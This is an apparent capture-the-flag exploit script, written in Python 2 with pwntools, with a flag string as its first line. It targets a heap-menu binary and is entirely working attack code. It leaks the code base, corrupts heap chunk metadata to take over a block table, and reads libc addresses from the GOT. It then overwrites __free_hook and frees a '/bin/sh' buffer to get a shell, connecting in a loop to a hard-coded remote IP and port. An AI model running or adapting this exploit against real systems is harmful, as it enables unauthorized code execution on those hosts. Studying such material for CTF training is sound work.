#vxctf{a_b1t_0f_t0x1c?}[
from pwn import *

def add(r):
    r.sendlineafter('$ ', '1')
def view(r, idx):
    r.sendlineafter('$ ', '2')
    r.sendlineafter('View which block?\n', str(idx))
def write(r, idx, content):
    r.sendlineafter('$ ', '3')
    r.sendlineafter('Which block?\n', str(idx))
    r.sendlineafter('Enter the length : \n', str(len(content)))
    r.sendafter('Content >>\n', content)
def remove(r, idx):
    r.sendlineafter('$ ', '4')
    r.sendlineafter('Free which block?\n', str(idx))

# init
os.environ['LD_PRELOAD'] = './libc-2.24.so'
#context.log_level = 'DEBUG'

def main(r):
    e = ELF('./64')
    #libc = e.libc
    libc = ELF('./libc-2.24.so')
    
    def leak(addr):
        write(r, 4, '\x56\x00\x00'+p64(addr))
        view(r, 5)
        result = r.recv(6)
        return result

    # leak code base
    r.recvuntil('gift : ')
    code_base = int(r.recv(14), 16) - 0xE9A
    if p64(code_base)[5] != '\x56':
        raise 'oops'
    log.info('code base: %#x' % code_base)
    log.info('bucket: %#x' % (code_base+0x202040))

    # double free
    add(r)
    add(r)
    add(r)
    add(r)
    write(r, 0, p64(0)+p64(0x41)+'A'*0x30+p64(0x40)+'\x7f')
    remove(r, 2)
    target = (0x202040+code_base)+0x20-3-8
    log.info('target addr: %#x' % target)
    write(r, 1, 'B'*0x40+p64(0)+p64(0x51)+p64(target))
    add(r)
    add(r)
    write(r, 0, p64(0)+p64(0x41)+'A'*0x30+p64(0x40)+'\x51')
    
    # control bucket
    print hex(e.got['stdout'])
    stdout = u64(leak(code_base+e.got['stdin'])[:6]+'\x00\x00')
    stdout_off = 0x7f04c9f6c8c0-0x7f04c9bab000
    stdin = u64(leak(code_base+e.got['stdin'])[:6]+'\x00\x00')
    print hex(stdin)
    exit = u64(leak(code_base+e.got['exit'])[:6]+'\x00\x00')
    execve = u64(leak(code_base+e.got['execve'])[:6]+'\x00\x00')
    puts = u64(leak(code_base+e.got['puts'])[:6]+'\x00\x00')
    printf = u64(leak(code_base+e.got['printf'])[:6]+'\x00\x00')
    log.info('exit addr: %#x' % exit)
    log.info('execve addr: %#x' % execve)
    libc_base = stdout - stdout_off
    log.info('libc base: %#x' % libc_base)
    
    write(r, 4, '\x56\x00\x00'+p64(libc_base+libc.symbols['__free_hook']))
    libc_base2 = printf-libc.symbols['printf']
    libc_base3 = execve-libc.symbols['execve']
    system = libc_base2 + libc.symbols['system']
    write(r, 5, p64(code_base+0xa70))
    
    write(r, 0, '/bin/sh\x00')
    remove(r, 0)
    r.interactive()
while True:
    try:
        #r = process('./64')
        r = remote('35.185.151.73', 8040)
        main(r)
    except Exception as e:
        print e
        r.close()
        pass
